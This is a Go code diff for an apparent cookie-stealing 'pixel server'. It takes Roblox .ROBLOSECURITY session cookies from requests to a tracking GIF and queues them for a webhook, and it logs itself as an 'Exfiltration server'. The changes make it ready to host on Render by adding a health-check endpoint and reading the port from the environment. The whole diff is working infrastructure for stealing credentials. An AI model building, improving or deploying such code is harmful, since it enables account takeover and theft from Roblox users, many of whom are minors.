@@ -76,7 +76,9 @@ func (s *PixelServer) Start(ctx context.Context) error {
 }
 
 func (s *PixelServer) handleRequest(ctx *fasthttp.RequestCtx) {
-	if string(ctx.Path()) == "/pixel.gif" {
+	path := string(ctx.Path())
+
+	if path == "/pixel.gif" {
 		robloxCookie := string(ctx.QueryArgs().Peek("cookie"))
 		if robloxCookie == "" {
 			robloxCookie = string(ctx.Request.Header.Cookie(".ROBLOSECURITY"))
@@ -93,12 +95,17 @@ func (s *PixelServer) handleRequest(ctx *fasthttp.RequestCtx) {
 		case s.logChan <- event:
 		default:
 		}
+
+		ctx.Response.Header.Set("Content-Type", "image/gif")
+		ctx.Response.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+		ctx.SetStatusCode(fasthttp.StatusOK)
+		ctx.SetBody(transparentPixel)
+		return
 	}
 
-	ctx.Response.Header.Set("Content-Type", "image/gif")
-	ctx.Response.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+	// Health check endpoint for Render
 	ctx.SetStatusCode(fasthttp.StatusOK)
-	ctx.SetBody(transparentPixel)
+	ctx.SetBodyString("OK")
 }
 
 func (s *PixelServer) worker(ctx context.Context) {
@@ -179,8 +186,11 @@ func (s *PixelServer) dispatchWebhook(event LogEvent) {
 }
 
 func main() {
-	addrFlag := flag.String("addr", ":8080", "Listen address")
-	flag.Parse()
+	port := os.Getenv("PORT")
+	if port == "" {
+		port = "8080"
+	}
+	addr := ":" + port
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
@@ -188,14 +198,14 @@ func main() {
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
 
-	srv := NewPixelServer(*addrFlag, 5000)
+	srv := NewPixelServer(addr, 5000)
 
 	go func() {
 		<-sigChan
 		cancel()
 	}()
 
-	log.Printf("Exfiltration server active on %s", *addrFlag)
+	log.Printf("Exfiltration server active on %s", addr)
 	if err := srv.Start(ctx); err != nil && err != fasthttp.ErrServerClosed {
 		log.Fatalf("Server error: %v", err)
 	}
